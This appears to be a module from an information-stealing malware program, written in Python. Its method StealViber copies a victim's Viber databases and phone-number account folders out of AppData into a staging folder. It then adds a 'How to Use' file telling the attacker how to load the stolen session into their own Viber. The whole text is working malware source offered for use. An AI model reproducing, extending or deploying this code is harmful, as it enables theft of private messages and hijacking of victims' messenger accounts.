import os
from pathlib import Path
import re
import shutil


async def StealViber(self, directory_path: str) -> None:
        try:
            found_viber = False
            viber_path = os.path.join(self.appdata, 'ViberPC')
            copied_path = os.path.join(directory_path, "Messenger", "Viber")
            if os.path.isdir(viber_path):
                if not os.path.exists(copied_path):
                    os.mkdir(copied_path)
                pattern = re.compile(r"^(\+?[0-9]{1,12})$")
                directories = [entry for entry in Path(viber_path).iterdir() if entry.is_dir() and pattern.match(entry.name)]
                root_files = [file for file in Path(viber_path).glob("*.db")]

                for root_file in root_files:
                    shutil.copy(root_file, copied_path)

                for directory in directories:
                    destination_path = os.path.join(copied_path, directory.name)
                    shutil.copytree(directory, destination_path)
                    files = [file for file in directory.rglob("*") if file.is_file() and re.search(r"\.db$|\.db-wal$", file.name)]
                    for file in files:
                        dest_file_path = os.path.join(destination_path, file.name)
                        shutil.copy(file, dest_file_path)
                    found_viber = True
                if found_viber:
                    os.mkdir(os.path.join(copied_path, "How to Use"))
                    with open(os.path.join(copied_path, "How to Use", "How to Use.txt"), "a", errors="ignore") as write_file:
                        write_file.write("First, open this file path on your computer <%appdata%\\ViberPC>.\nDelete all the files here, then copy the stolen files to this folder.\nAfter all this run Viber")
                if len(os.listdir(copied_path)) == 0:
                    os.rmdir(copied_path)
        except Exception as e:
            print(f"viber error - {str(e)}")
            pass